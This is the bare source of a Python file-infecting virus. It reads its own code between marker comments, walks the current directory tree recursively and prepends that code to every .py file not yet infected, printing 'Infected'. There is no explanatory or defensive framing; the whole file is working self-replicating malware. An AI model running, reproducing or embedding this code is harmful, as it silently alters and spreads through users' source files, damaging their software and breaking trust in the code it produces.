#STARTED#
import os, sys
def virus(python):
    begin = "#STARTED#\n"
    end = "#STOPPED#\n"
    with open(sys.argv[0],'r') as copy:
        k = 0
        virus_code = "\n"
        for line in copy:
            if line == begin:
                virus_code = virus_code + begin
                k = 1
            elif k == 1 and line != end:
                virus_code = virus_code + line
            elif line == end:
                virus_code = virus_code + end
                break
            else:
                pass
    with open(python, "r") as files:
        origin_code = ""
        for line in files:
            origin_code = origin_code + line
            if line == begin:
                Virus = True
                break
            else:
                Virus = False
    if Virus == False:
        with open(python, "w") as paste:
            paste.write(virus_code + "\n\n" + origin_code)


def code(void):
    print("Infected")


def walk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isfile(path):
            if os.path.splitext(path)[1] == ".py":
                virus(path)
            else:
                pass
        else:
            walk(path)


code(None)
walk(os.getcwd())

#STOPPED#